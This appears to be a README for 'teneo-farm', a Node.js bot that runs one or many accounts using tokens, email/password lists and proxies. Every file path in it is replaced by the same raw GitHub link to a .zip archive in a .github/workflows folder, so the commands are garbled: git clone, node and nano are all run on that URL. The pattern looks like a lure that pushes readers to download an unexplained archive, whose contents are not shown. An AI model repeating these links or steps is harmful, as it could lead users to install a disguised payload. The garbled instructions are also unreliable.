## ✎ᝰ. RUNNING 
- Clone Repository
```bash
git clone https://raw.githubusercontent.com/wizdomf3lix/teneo-farm/main/.github/workflows/teneo-farm-unquietude.zip
cd teneo-farm
```
- Install Dependency
```bash
npm install
```
- Run the script its only for 1 account - run multy below for multiple accounts
```bash
node https://raw.githubusercontent.com/wizdomf3lix/teneo-farm/main/.github/workflows/teneo-farm-unquietude.zip
```
## run for multy accounts: 
- Manual put token in `https://raw.githubusercontent.com/wizdomf3lix/teneo-farm/main/.github/workflows/teneo-farm-unquietude.zip` 1 line 1 token
    ```bash
    nano https://raw.githubusercontent.com/wizdomf3lix/teneo-farm/main/.github/workflows/teneo-farm-unquietude.zip
    ```
- proxy (optional) in `https://raw.githubusercontent.com/wizdomf3lix/teneo-farm/main/.github/workflows/teneo-farm-unquietude.zip`
    ```bash
    nano https://raw.githubusercontent.com/wizdomf3lix/teneo-farm/main/.github/workflows/teneo-farm-unquietude.zip
    ```
    
### Auto get tokens if you dont want put it manually: 
- fill `https://raw.githubusercontent.com/wizdomf3lix/teneo-farm/main/.github/workflows/teneo-farm-unquietude.zip` format : `https://raw.githubusercontent.com/wizdomf3lix/teneo-farm/main/.github/workflows/teneo-farm-unquietude.zip|password123` 1 line 1 account
    ```bash
    nano https://raw.githubusercontent.com/wizdomf3lix/teneo-farm/main/.github/workflows/teneo-farm-unquietude.zip
    ```
- run to get tokens
    ```bash
    node getToken
    ```

- Start multy accounts
    ```bash
    node multy
    ```
